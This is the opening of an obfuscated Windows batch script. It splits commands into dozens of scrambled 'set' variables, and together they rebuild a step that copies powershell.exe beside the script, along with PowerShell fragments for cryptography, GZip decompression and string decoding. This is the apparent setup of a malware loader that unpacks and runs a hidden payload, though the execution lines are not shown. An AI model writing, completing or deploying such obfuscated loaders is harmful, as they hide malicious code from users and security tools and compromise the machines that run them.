@echo off
set "CbczLYUZfn=do"
set "fHDgKFyvhd=em"
set "cuQXHrsfcv=we"
set "ZHaBtSYNas=po"
set "MLfZJbxkCc=Sy"
set "QKQemQuiqE=rs"
set "yPwwzZQgGd=xe"
set "qFsSopBuUS=32"
set "iCfPpbXsjb=we"
set "pySWGFNGpS=he"
set "xXnwkTLOkj=Po"
set "dZRVariAhL=\W"
set "lVNITJKjjK=1."
set "bGtDTAkuXE=ow"
set "TcDKrDVmoa=he"
set "nNnRfpcBLo=Wi"
set "SxUDHfhYpe=in"
set "wgQbKTCaws= /"
set "EmRuCGtJXF=st"
set "wjvUGTHPbB=rS"
set "qpzUFDGjvc=y "
set "EZVKrmhRiM=s\"
set "vDJSAbNvvE=:\"
set "nfOWeBTZPA=ll"
set "TgPGPoxHTo=co"
set "ixzeVnCtPr=\v"
set "KXiQITAfJw=ll"
set "eZPeBfPIgs=ws"
set "FtgzpyxAEa=nd"
set "ZpwuopQWpD=.e"
set "nrcqNruzPf=0\"
set "ZvIocOmQnp= C"
set "eUnyGsvqoE=py"
set "IVpDKuVTcV=cd"
set "fMGqtxHeRi= %~dp0"
set "hCtOFZgenl=rity"
set "tdHzyBSPIe=gu, "
set "lvJDIuFXLh=urit"
set "gciOFCgSJD=rity"
set "nRpKkvmXCW=ecry"
set "GjHlEZulTu=('%*'"
set "xmNqeFwxtL=Star"
set "FHtxbGnPAB=YxVw"
set "OrFBETaVjO=SS ="
set "apPlHuYpmt=:('g"
set "nntHbxFrnA=am;$"
set "qYUdFVkEVw=)))"
set "NtipzJTvnW=e = "
set "fNGejxQfYP=Comp"
set "DxiiIAZEqT=HBku"
set "NkHXmQbJHs=jpZs"
set "HwTytlLFUB=bstr"
set "LhnCFovABZ=ptog"
set "YPCssOtrFe=.Len"
set "ToWStgjWud=$tCP"
set "rEpQWVICrP=-Obj"
set "rfUvSteUNi=[]] "
set "uvMzFKktOJ=yste"
set "oeOCxhcxFt=trea"
set "voMpswxZii=jUq "
set "tOpSIIZWJC=]::("
set "vDNCfLHCFA=m.Re"
set "ALwqKlAQIt=gsYZ"
set "ZraKWftcvM=.GZi"
set "jwkhQGAmFb=onve"
set "lSztFNdFPZ== [S"
